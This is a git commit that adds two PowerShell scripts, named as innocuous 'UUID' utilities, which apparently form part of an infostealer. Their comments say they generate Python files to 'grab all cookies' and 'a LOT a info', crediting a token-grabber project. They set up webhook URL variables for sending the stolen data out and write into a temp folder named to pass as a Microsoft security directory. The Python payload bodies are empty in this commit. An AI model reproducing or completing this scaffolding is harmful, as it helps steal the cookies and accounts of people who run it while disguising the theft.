6d1055388502a8a73d114e44a5c97038cee1986f
Appolon24800 <93398824+Appolon24800@users.noreply.github.com>
2023-01-17 18:59:54 +0100

    sdsdsdsd
    sdqsdqsdqsd

---
+++ UUID_create.ps1
@@ -0,0 +1,20 @@
+#####################################################################
+# This is for create the "UUID.py" files
+#
+#
+# For grab all cookies (thx to https://github.com/Smug246/Luna-Token-Grabber)
+#
+#####################################################################
+
+############################VARIABLES################################
+$webHookUrlPYTHON="'"+$webHookUrl+"'"
+$webHookUrlPYTHON2="""$webHookUrl"""
+$webHookUrlPYTHON3="'"+$webHookUrlPYTHON2+"'"
+$webHookUrl2="$"+"webHookUrl"
+#####################################################################
+
+cd C:\Windows\Temp\Win.microsoft.Security.temp
+
+Set-Content UUID_create.py "
+
+"
---
+++ UUID_utils.ps1
@@ -0,0 +1,22 @@
+#####################################################################
+# This is for create the "UUID_gen.py" files
+#
+#
+# For grab a LOT a info (idk what info 
+#
+#####################################################################
+
+############################VARIABLES################################
+$webHookUrlPYTHON="'"+$webHookUrl+"'"
+$webHookUrlPYTHON2="""$webHookUrl"""
+$webHookUrlPYTHON3="'"+$webHookUrlPYTHON2+"'"
+$webHookUrl2="$"+"webHookUrl"
+#####################################################################
+
+
+
+
+cd C:\Windows\Temp\Win.microsoft.Security.temp
+Set-Content UUID_utils.py "
+
+"
